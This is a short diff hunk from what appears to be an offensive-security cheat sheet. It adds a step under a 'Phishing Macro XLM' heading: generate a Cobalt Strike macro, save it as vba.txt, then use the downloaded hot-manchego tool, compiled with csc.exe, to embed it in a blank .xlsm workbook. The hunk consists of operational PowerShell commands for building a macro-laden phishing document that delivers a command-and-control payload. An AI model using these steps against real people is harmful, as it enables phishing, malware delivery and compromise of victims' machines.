@@ -165,6 +165,7 @@ Remote Execute
       
 Phishing Macro XLM 
     Download https://github.com/FortyNorthSecurity/hot-manchego
+    Generate CS Macro and save it to Windows as vba.txt
     PS> New-Item blank.xlsm
     PS> C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:EPPlus.dll hot-manchego.cs
     PS> .\hot-manchego.exe .\blank.xlsm .\vba.txt
